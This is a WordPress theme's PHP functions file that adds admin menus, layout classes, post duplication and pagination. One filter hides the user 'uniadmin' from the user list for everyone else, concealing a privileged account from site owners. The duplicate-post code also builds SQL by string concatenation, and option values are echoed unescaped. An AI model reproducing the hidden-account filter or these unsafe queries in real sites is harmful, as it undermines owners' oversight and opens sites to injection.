<?php
/**
 * Dashboard
 * @package Uni_Theme
 * @author  
 * @license 
 * @link    
 */

function uni_option($field) {
    $value = get_field($field,'option');
    return $value;
}

function add_menu_admin_bar_link() {
    global $wp_admin_bar;
    //Add menu
    $args = array(
        'id' => 'theme-options',
        'title' => __('Theme Settings','shtheme'),
        // 'href' => esc_url( admin_url( 'admin.php?page=theme-options' ) ),
    );
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-option-settings',
        'title' => ''.esc_html__( 'Theme Options','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-options' ) ),
        'parent'=> 'theme-options'
    );
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-block-settings',
        'title' => ''.esc_html__( 'Block','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-block-settings' ) ),
        'parent'=> 'theme-options'
    );
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-slider-settings',
        'title' => ''.esc_html__( 'Slider','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-slider-settings' ) ),
        'parent'=> 'theme-options'
    );
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-category-settings',
        'title' => ''.esc_html__( 'Category','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-category-settings' ) ),
        'parent'=> 'theme-options'
    );
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-recruitment-settings',
        'title' => ''.esc_html__( 'Recruitment','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-recruitment-settings' ) ),
        'parent'=> 'theme-options'
    );
    if ( class_exists( 'WooCommerce' ) ) {
        $wp_admin_bar->add_node( $args );
            $args = array(
            'id' => 'theme-woocommerce-settings',
            'title' => ''.esc_html__( 'Product','shtheme' ).'',
            'href' => esc_url( admin_url( 'admin.php?page=theme-product-settings' ) ),
            'parent'=> 'theme-options' 
        );
    }
    $wp_admin_bar->add_node( $args );
        $args = array(
        'id' => 'theme-contact-settings',
        'title' => ''.esc_html__( 'Contact','shtheme' ).'',
        'href' => esc_url( admin_url( 'admin.php?page=theme-contact-settings' ) ),
        'parent'=> 'theme-options'
    );
    $wp_admin_bar->add_node( $args );
}
add_action('admin_bar_menu', 'add_menu_admin_bar_link',999);

// remove aim, jabber, yim 
function hide_profile_fields( $contactmethods ) {
    unset($contactmethods['facebook']);
    unset($contactmethods['instagram']);
    unset($contactmethods['linkedin']);
    unset($contactmethods['myspace']);
    unset($contactmethods['pinterest']);
    unset($contactmethods['soundcloud']);
    unset($contactmethods['tumblr']);
    unset($contactmethods['twitter']);
    unset($contactmethods['youtube']);
    unset($contactmethods['wikipedia']);
    return $contactmethods;
}
add_filter('user_contactmethods','hide_profile_fields',10,1);


// Logout Accout
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
    wp_redirect(''.get_site_url().'');
    exit();
}

/**
 * Custom Login Page
 */
function uni_login_logo() {
	if( uni_option('btn-hidden-info') == false ) {
		wp_enqueue_style( 'login-custom-style', get_template_directory_uri() .'/assets/css/login.min.css' );
	}
}
add_action( 'login_enqueue_scripts', 'uni_login_logo' );

/**
 * Remove Dashboard
**/
function disable_default_dashboard_widgets() {
	global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);

}
add_action('wp_dashboard_setup', 'disable_default_dashboard_widgets', 999);

/**
 * Remove Admin Bar
**/
function remove_wp_logo( $wp_admin_bar ) {
	$wp_admin_bar->remove_node('wp-logo');
	$wp_admin_bar->remove_node('comments');
}
add_action('admin_bar_menu', 'remove_wp_logo', 999);

/**
 * Hide Menu Page If User Not uniadmin
**/
function remove_menus() {
	global $current_user, $submenu;
	$username = $current_user->user_login;
	if( uni_option( 'user-developer' ) == true && ( $username != 'uniadmin' ) ) {
		remove_menu_page( 'plugins.php' );
	 	remove_menu_page( 'tools.php' );
	 	remove_menu_page( 'options-general.php' );
	 	remove_menu_page( 'edit-comments.php' );
	 	remove_menu_page( 'edit.php?post_type=acf-field-group' );
    	remove_menu_page( 'wpcf7' );
    	unset( $submenu['index.php'][10] );
	    unset( $submenu['themes.php'][5] );
	    unset( $submenu['themes.php'][20] );
	    unset( $submenu['themes.php'][22] );
	}
}
add_action( 'admin_menu', 'remove_menus', 999 );

function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ( $username != 'uniadmin' ) {
		global $wpdb;
		$user_search->query_where = str_replace( 'WHERE 1=1',
		"WHERE 1=1 AND {$wpdb->users}.user_login != 'uniadmin'",$user_search->query_where );
	}
}
add_action('pre_user_query','yoursite_pre_user_query');


/**
 * Display Logo
 */
if ( ! function_exists( 'display_logo' ) ) {
    function display_logo(){
        $image = uni_option( 'logo');
        if( $image ) {
            echo '<a class="d-block" id="logo" href="'. esc_url( home_url( '/' ) ) .'"><img alt="Logo" src="'. esc_url( $image ) .'"></a>';
        }
    }
}
/**
 * Display Favicon
 */
function insert_favicon() {
    $url_favicon = uni_option( 'favicon');
    if ($url_favicon) {
        echo '<link rel="shortcut icon" href="' . $url_favicon . '" type="image/x-icon" />';
    }
}
add_action('wp_head', 'insert_favicon');

if ( ! function_exists( 'get_page_template_url' ) ) {
    function get_page_template_url($TEMPLATE_NAME){
        $url = null;
        $pages = get_pages(array(
            'meta_key' => '_wp_page_template',
            'meta_value' => $TEMPLATE_NAME
        ));
        if(isset($pages[0])) {
            $url = get_page_link($pages[0]->ID);
        }
        return $url;
    }
}

if ( ! function_exists( 'the_content_limit' ) ) {
    function the_content_limit( $max_characters, $more_link_text = '(more...)', $stripteaser = false ) {
        $content = get_the_content_limit( $max_characters, $more_link_text, $stripteaser );
        echo apply_filters( 'the_content_limit', $content );
    }   
}

if ( ! function_exists( 'get_the_content_limit' ) ) {
    function get_the_content_limit( $max_characters, $more_link_text = '(more...)', $stripteaser = false ) {
        $content = get_the_content( '', $stripteaser );
        // Strip tags and shortcodes so the content truncation count is done correctly.
        $content = strip_tags( strip_shortcodes( $content ), apply_filters( 'get_the_content_limit_allowedtags', '<script>,<style>' ) );
        // Remove inline styles / scripts.
        $content = trim( preg_replace( '#<(s(cript|tyle)).*?</\1>#si', '', $content ) );
        // Truncate $content to $max_char.
        $content = uni_truncate_phrase( $content, $max_characters );
        // More link?
        if ( $more_link_text ) {
            $link   = apply_filters( 'get_the_content_more_link', sprintf( '&#x02026; <a href="%s" class="more-link">%s</a>', get_permalink(), $more_link_text ), $more_link_text );
            $output = sprintf( '<p>%s %s</p>', $content, $link );
        } else {
            $output = sprintf( '<p>%s</p>', $content );
            $link = '';
        }
        return apply_filters( 'get_the_content_limit', $output, $content, $link, $max_characters );
    }
}

if ( ! function_exists( 'uni_truncate_phrase' ) ) {
    function uni_truncate_phrase( $text, $max_characters ) {
        if ( ! $max_characters ) {
            return '';
        }
        $text = trim( $text );
        if ( mb_strlen( $text ) > $max_characters ) {
            // Truncate $text to $max_characters + 1.
            $text = mb_substr( $text, 0, $max_characters + 1 );
            // Truncate to the last space in the truncated string.
            $text_trim = trim( mb_substr( $text, 0, mb_strrpos( $text, ' ' ) ) );
            $text = empty( $text_trim ) ? $text : $text_trim;
        }
        return $text;
    }
}


/**
 * Add Header Class
 */
if ( ! function_exists( 'header_class' ) ) {
    function header_class( ) {
        $array_class_header = array('site-header');
        $layout_header 		= uni_option('opt-layout-header');
        if ( $layout_header == '1' ) {
            $array_class_header[] = 'header-logo';
        } elseif ( $layout_header == '2' ) {
            $array_class_header[] = 'header-logo-content';
        }
        echo 'class="' . join( ' ', $array_class_header ) . '"';
    }
}

/**
 * Display header.
 */
if ( ! function_exists( 'uni_header_layout' ) ) {
    function uni_header_layout() {
        $layout_header = uni_option('opt-layout-header');
        if ( $layout_header == '1' ) {
            get_template_part( 'template-parts/header/header-logo' );
        } elseif ( $layout_header == '2' ) {
            get_template_part( 'template-parts/header/header-logo-content' );
        }
    }
}

/**
 * Add Body Class
 */
function add_class_body_layout( $classes ) {
    $layout = uni_option( 'opt-layout' );
    $blogpost_layout = uni_option( 'blogpost-grid' );
    $recruitment_layout = uni_option( 'recruitment-grid' );
    $blogpost_single_layout = uni_option( 'blogpost-single-grid' );
    if( class_exists( 'WooCommerce' )) {
        $product_layout = uni_option( 'product-grid' );
        $product_single_layout = uni_option( 'product-single-grid' );
    }
	if( class_exists( 'WooCommerce' ) && ( is_cart() || is_account_page() || is_checkout() ) ) {
		$classes[] = 'no-sidebar';
	} else {
		if( is_front_page() ) {
            switch ( $layout ) {
                case '1':
                    $classes[] = 'no-sidebar';
                    break;
                case '2':
                    $classes[] = 'sidebar-left';
                    break;
                case '3':
                    $classes[] = 'sidebar-right';
                    break;
                    break;
            }
        }
        if( is_category() ) {
            switch ( $blogpost_layout ) {
                case '1':
                    $classes[] = 'no-sidebar';
                    break;
                case '2':
                    $classes[] = 'sidebar-left';
                    break;
                case '3':
                    $classes[] = 'sidebar-right';
                    break;
                    break;
            }
        }
        if( is_tax('recruitment_cat') ) {
            switch ( $recruitment_layout ) {
                case '1':
                    $classes[] = 'no-sidebar';
                    break;
                case '2':
                    $classes[] = 'sidebar-left';
                    break;
                case '3':
                    $classes[] = 'sidebar-right';
                    break;
                    break;
            }
        }
        if( is_singular('post') ) {
            switch ( $blogpost_single_layout ) {
                case '1':
                    $classes[] = 'no-sidebar';
                    break;
                case '2':
                    $classes[] = 'sidebar-left';
                    break;
                case '3':
                    $classes[] = 'sidebar-right';
                    break;
                    break;
            }
        }
        if( class_exists( 'WooCommerce' )) {
            if(is_tax('product_cat') || is_shop()) {
                switch ( $product_layout ) {
                    case '1':
                        $classes[] = 'no-sidebar';
                        break;
                    case '2':
                        $classes[] = 'sidebar-left';
                        break;
                    case '3':
                        $classes[] = 'sidebar-right';
                        break;
                        break;
                }
            }
            if( is_singular('product') ) {
                switch ( $product_single_layout ) {
                    case '1':
                        $classes[] = 'no-sidebar';
                        break;
                    case '2':
                        $classes[] = 'sidebar-left';
                        break;
                    case '3':
                        $classes[] = 'sidebar-right';
                        break;
                        break;
                }
            }
        }
	}
	return $classes;
}
add_filter( 'body_class', 'add_class_body_layout' );

/**
 * Enqueue Script File And Css File
 */
function uni_scripts() {
	wp_enqueue_style( 'unitheme-style', get_stylesheet_uri() );
	wp_enqueue_style( 'custom-style', UNI_DIR .'/assets/css/custom-style.css' );
}
add_action( 'wp_enqueue_scripts', 'uni_scripts', 51 );

/**
 * Remove Title
 */
add_filter( 'get_the_archive_title', function ($title) {
    if ( is_category() ) {
        $title = single_cat_title( '', false );
    } elseif ( is_tag() ) {
        $title = single_tag_title( '', false );
    } elseif ( is_author() ) {
        $title = '<span class="vcard">' . get_the_author() . '</span>';
    }
    return $title;
});

/**
 * Security
 */
/* Disable Rest API */
function disable_rest_api() {
	if( ! is_user_logged_in() ) {
		return new WP_Error('Error!', __('Unauthorized access is denied!','rest-api-error'), array('status' => rest_authorization_required_code()));
	}
}
// add_filter('rest_authentication_errors','disable_rest_api');

/* Disable XML RPC */
add_filter( 'xmlrpc_enabled', '__return_false' );

/**
 * Set view post
**/
if ( ! function_exists( 'postview_set' ) ) {
    function postview_set( $postID ) {
        $count_key 	= 'postview_number';
        $count 		= get_post_meta( $postID, $count_key, true );
        if( $count == '' ) {
            $count = 0;
            delete_post_meta( $postID, $count_key );
            add_post_meta( $postID, $count_key, '0' );
        } else {
            $count++;
            update_post_meta( $postID, $count_key, $count );
        }
    }
}

/**
 * Get view post
**/
if ( ! function_exists( 'postview_get' ) ) {
    function postview_get( $postID ){
        $count_key 	= 'postview_number';
        $count 		= get_post_meta( $postID, $count_key, true );
        if ( $count == '' ){
            delete_post_meta( $postID, $count_key );
            add_post_meta( $postID, $count_key, '0' );
            return '0 '.__( 'views', 'shtheme' );
        }
        return '<span>'.$count.'</span> '. __( 'views', 'shtheme' );
    }
}

remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

/**
 * Get term name
 */
if ( ! function_exists( 'get_dm_name' ) ) {
    function get_dm_name( $cat_id, $taxonomy ) {
        $cat_id 	= (int) $cat_id;
        $category 	= get_term( $cat_id, $taxonomy );
        if ( ! $category || is_wp_error( $category ) )
        return '';
        return $category->name;
    }   
}

/**
 * Get term link
 */
if ( ! function_exists( 'get_dm_link' ) ) {
    function get_dm_link( $category, $taxonomy ) {
        if ( ! is_object( $category ) )
        $category = (int) $category;
        $category = get_term_link( $category, $taxonomy );
        if ( is_wp_error( $category ) )
        return '';
        return $category;
    }
}

function uni_comment($comment, $args, $depth)    {
    $GLOBALS['comment'] = $comment; ?>
    <li <?php comment_class();?> id="li-comment-<?=get_comment_ID();?>">    
        <div class="comment-item" id="comment-<?=get_comment_ID();?>" class="clearfix">
             <div class="comment-author vcard">
                <?php echo get_avatar($comment, $size='70', ''); ?>  
             </div><!-- end comment autho vcard-->
        
	         <div class="comment-content">
	        	 <div class="comment-meta commentmetadata">
	              <?php printf(('<span class="fn">%s</span>'), get_comment_author_link()); ?> - <?php printf(('<a href="#comment-%d" class="ngaythang">%s</a>'),get_comment_ID(),get_comment_date('d F, Y'));?>            
	             </div><!--end .comment-meta-->
	            <?php if($comment->comment_approved == '0') : ?>
	                <div class="comment-moderation"><?php echo __('Your coment is waiting for moderation.','shtheme');?></div>
	                <?php endif; ?>
				<div class="comment-text">
	            	<?php comment_text(); ?>
	            </div>
	            <div class="comment-action">	                
		            <?php comment_reply_link(array_merge($args,array('respond_id' => 'commentform','depth' => $depth, 'max_depth'=> $args['max_depth'])));?>		            
              		<?php edit_comment_link(__('Edit'),' ',''); ?>
	            </div>
	            	
	        </div><!--end #commentBody-->
        </div><!--end #comment-author-vcard-->
	</li>
    <?php 
}
/*
 * Duplicate Post - Page
 */
function uni_duplicate_post_as_draft(){
    global $wpdb;
    if (! ( isset( $_GET['post']) || isset( $_POST['post'])  || ( isset($_REQUEST['action']) && 'uni_duplicate_post_as_draft' == $_REQUEST['action'] ) ) ) {
      	wp_die('No post to duplicate has been supplied!');
    }

    /*
     * Nonce verification
     */
    if ( !isset( $_GET['duplicate_nonce'] ) || !wp_verify_nonce( $_GET['duplicate_nonce'], basename( __FILE__ ) ) )
  	return;

    /*
     * get the original post id
     */
    $post_id = (isset($_GET['post']) ? absint( $_GET['post'] ) : absint( $_POST['post'] ) );
    /*
     * and all the original post data then
     */
    $post = get_post( $post_id );

    /*
     * if you don't want current user to be the new post author,
     * then change next couple of lines to this: $new_post_author = $post->post_author;
     */
    $current_user = wp_get_current_user();
    $new_post_author = $current_user->ID;

    /*
     * if post data exists, create the post duplicate
     */
    if (isset( $post ) && $post != null) {

	    /*
	     * new post data array
	     */
		$args = array(
			'comment_status' => $post->comment_status,
			'ping_status'    => $post->ping_status,
			'post_author'    => $new_post_author,
			'post_content'   => $post->post_content,
			'post_excerpt'   => $post->post_excerpt,
			'post_name'      => $post->post_name,
			'post_parent'    => $post->post_parent,
			'post_password'  => $post->post_password,
			'post_status'    => 'draft',
			'post_title'     => $post->post_title,
			'post_type'      => $post->post_type,
			'to_ping'        => $post->to_ping,
			'menu_order'     => $post->menu_order
		);

		/*
		* insert the post by wp_insert_post() function
		*/
		$new_post_id = wp_insert_post( $args );

		/*
		* get all current post terms ad set them to the new post draft
		*/
		$taxonomies = get_object_taxonomies($post->post_type); // returns array of taxonomy names for post type, ex array("category", "post_tag");
		foreach ($taxonomies as $taxonomy) {
			$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
			wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);
		}

	    /*
	     * duplicate all post meta just in two SQL queries
	     */
	    $post_meta_infos = $wpdb->get_results("SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$post_id");
	    if (count($post_meta_infos)!=0) {
	        $sql_query = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
	        foreach ($post_meta_infos as $meta_info) {
	            $meta_key = $meta_info->meta_key;
	            if( $meta_key == '_wp_old_slug' ) continue;
	            $meta_value = addslashes($meta_info->meta_value);
	            $sql_query_sel[]= "SELECT $new_post_id, '$meta_key', '$meta_value'";
	        }
	        $sql_query.= implode(" UNION ALL ", $sql_query_sel);
	        $wpdb->query($sql_query);
	    }

	    /*
	     * finally, redirect to the edit post screen for the new draft
	     */
	    wp_redirect( admin_url( 'post.php?action=edit&post=' . $new_post_id ) );
	    exit;
    } else {
        wp_die('Post creation failed, could not find original post: ' . $post_id);
    }
}
add_action( 'admin_action_uni_duplicate_post_as_draft', 'uni_duplicate_post_as_draft' );

/*
 * Add the duplicate link to action list for post_row_actions
 */
function uni_duplicate_post_link( $actions, $post ) {
    if (current_user_can('edit_posts')) {
        $actions['duplicate'] = '<a href="' . wp_nonce_url('admin.php?action=uni_duplicate_post_as_draft&post=' . $post->ID, basename(__FILE__), 'duplicate_nonce' ) . '" title="'.__('Duplicate this item','shtheme').'" rel="permalink">'.__('Duplicate','shtheme').'</a>';
    }
    return $actions;
}

add_filter( 'post_row_actions', 'uni_duplicate_post_link', 10, 2 );
add_filter('page_row_actions', 'uni_duplicate_post_link', 10, 2);

// Check Phone Contact Form 7
// if (!function_exists('is_plugin_active')) {
//     include_once(ABSPATH . 'wp-admin/includes/plugin.php');
//     if ( is_plugin_active( 'contact-form-7/wp-contact-form-7.php' ) ) {
//         function custom_filter_wpcf7_is_tel( $result, $tel ) { 
//             $result = preg_match( '/^(0|\+84)(\s|\.)?((3[2-9])|(5[689])|(7[06-9])|(8[1-689])|(9[0-46-9]))(\d)(\s|\.)?(\d{3})(\s|\.)?(\d{3})$/', $tel );
//             return $result; 
//         }
//         add_filter( 'wpcf7_is_tel', 'custom_filter_wpcf7_is_tel', 10, 2 );
//     }
// }

// Remove Widget Gutenburg
add_filter( 'use_widgets_block_editor', '__return_false' );
add_filter( 'use_block_editor_for_post', '__return_false' );
add_filter( 'use_block_editor_for_page', '__return_false' );

// function wplook_activate_gutenberg_products($can_edit, $post_type){
// 	if($post_type == 'product'){
// 		$can_edit = true;
// 	}
// 	return $can_edit;
// }

function my_acf_init() {
    if(uni_option('google_api')) {
        acf_update_setting('google_api_key', ''.uni_option('google_api').'');
    }
}
add_action('acf/init', 'my_acf_init');

if( ! function_exists('get_primary_term') ) {
    function get_primary_term($taxonomy = 'category',$postID) {
        $category = wp_get_object_terms( 
            $postID,
            $taxonomy, //change taxonomy
            array(
                'orderby'   => 'term_group', 
                'order'     => 'DESC'
            )
        );
        if( function_exists('yoast_get_primary_term_id') && count( $category ) > 1 && yoast_get_primary_term_id( $taxonomy,$postID ) ) {
            $primary_ID = yoast_get_primary_term_id( $taxonomy,$postID );
        } else {
            $primary_ID = end( $category )->term_id;
        }
        return $primary_ID;
    }
}

function add_color_primary() {
    $primarycolor = uni_option( 'primary_color' );
    $secondarycolor = uni_option( 'secondary_color' );
    $textcolor = uni_option( 'text_color' );
    ?>
    <script>
        var primarycolor = '<?php echo $primarycolor; ?>';
            secondarycolor = '<?php echo $secondarycolor; ?>';
            textcolor = '<?php echo $textcolor; ?>';
        // Then we set the value in the --vh custom property to the root of the document
        document.documentElement.style.setProperty('--primarycolor', `${primarycolor}`);
        document.documentElement.style.setProperty('--secondarycolor', `${secondarycolor}`);
        document.documentElement.style.setProperty('--textcolor', `${textcolor}`);
    </script>
    <?php
}
add_action('wp_head','add_color_primary',0);

/**
 * Display Pagination
**/
if ( ! function_exists( 'uni_pagination' ) ) {
	function uni_pagination($the_query) {
		echo '<div class="pagination">';
            echo paginate_links( array(
                'base'         => str_replace( 999999999, '%#%', esc_url( get_pagenum_link( 999999999 ) ) ),
                'total'        => $the_query->max_num_pages,
                'current'      => max( 1, get_query_var( 'paged' ) ),
                'format'       => '?paged=%#%',
                'show_all'     => false,
                'type'         => 'list',
                'end_size'     => 2,
                'mid_size'     => 1,
                'prev_next'    => true,
                'prev_text'    => sprintf( '<i class="icon-angle-double-left"></i> %1$s','' ),
                'next_text'    => sprintf( '%1$s <i class="icon-angle-double-right"></i>','' ),
                'add_args'     => false,
                'add_fragment' => '',
            ) );
        echo '</div>';
	}
}

// is Mobile
function my_wp_is_mobile() {
    static $is_mobile;

    if ( isset($is_mobile) )
        return $is_mobile;

    if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
        $is_mobile = false;
    } elseif (
        strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false ) {
            $is_mobile = true;
    } elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false && strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') == false) {
            $is_mobile = true;
    } elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== false) {
        $is_mobile = false;
    } else {
        $is_mobile = false;
    }

    return $is_mobile;
}